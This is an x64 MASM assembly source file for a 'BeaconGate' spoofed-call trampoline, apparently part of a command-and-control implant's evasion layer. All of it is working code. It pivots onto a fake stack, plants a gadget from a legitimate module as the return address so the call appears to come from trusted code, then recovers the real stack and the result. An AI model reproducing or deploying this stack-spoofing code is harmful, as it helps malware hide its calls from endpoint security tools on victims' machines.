; gate_spoof.asm - C-58 BeaconGate spoofed-call trampoline (x64 MASM)
;
; Contract (offsets mirror GATE_SPOOFCTX in beacon_gate.cpp):
;   +0x00 fn          target function
;   +0x08 recovery    hop target of the gadget (jmp [rbp-8] lands here)
;   +0x10 saved_rsp   real-stack anchor, filled by this stub
;   +0x18 (pad)
;   +0x20 result      fn's RAX stored at recovery
;   +0x28 gadget      jmp [rbp-8] gadget inside a legit module
;   +0x30 fake_rsp    pivot rsp (page-aligned + 0x48, = 8 mod 16)
;   +0x38 args[0..3]  register args
;
; Flow: tail-jmp into fn with [rsp]=gadget (a legit-module return address);
; fn ret -> gadget -> jmp [rbp-8] (rbp = ctx+0x10) -> recovery with RAX
; intact; recovery restores the real stack and returns the value.

PUBLIC gate_spoof_execute
PUBLIC gate_spoof_recovery
EXTERN gate_spoof_probe:PROC
EXTERN gate_spoof_probe_tag:BYTE

.code

gate_spoof_execute PROC
    push rbp
    push rbx
    push r15
    sub  rsp, 28h
    mov  rbx, rcx                    ; ctx
    mov  [rbx+10h], rsp              ; saved real-stack anchor
    mov  rax, [rbx+00h]              ; fn
    mov  rcx, [rbx+38h]              ; args[0]
    mov  rdx, [rbx+40h]              ; args[1]
    mov  r8,  [rbx+48h]              ; args[2]
    mov  r9,  [rbx+50h]              ; args[3]
    mov  r15, [rbx+28h]              ; gadget
    mov  rbp, rbx
    add  rbp, 10h                    ; rbp-8 = ctx+0x08 = recovery
    mov  r10, [rbx+30h]              ; fake_rsp
    mov  [r10], r15                  ; fn's return-address slot = gadget
    mov  rsp, r10                    ; pivot onto the fake stack
    jmp  rax                         ; enter fn (stack args pre-laid above shadow)

gate_spoof_execute ENDP

gate_spoof_recovery PROC
    ; arrives via gadget ret; rbp = ctx+0x10; RAX = fn's return value
    mov  [rbp+10h], rax              ; ctx+0x20 result = RAX
    sub  rsp, 28h                    ; shadow for the probe call (fake stack)
    lea  rcx, gate_spoof_probe_tag
    mov  rdx, [rbx]                  ; fn pointer as the probe value
    call gate_spoof_probe
    add  rsp, 28h                    ; balance the probe shadow
    mov  rsp, [rbp+00h]              ; ctx+0x10 saved_rsp = R-0x40 (3 pushes 0x18 + shadow 0x28)
    add  rsp, 28h                    ; step past the shadow -> R-0x18 where pushed r15 sits
    mov  rax, [rbp+10h]              ; return value back into RAX
    pop  r15                         ; R-0x18 -> R-0x10
    pop  rbx                         ; R-0x10 -> R-0x08
    pop  rbp                         ; R-0x08 -> R
    ret                              ; back to gate_dispatch
gate_spoof_recovery ENDP

END
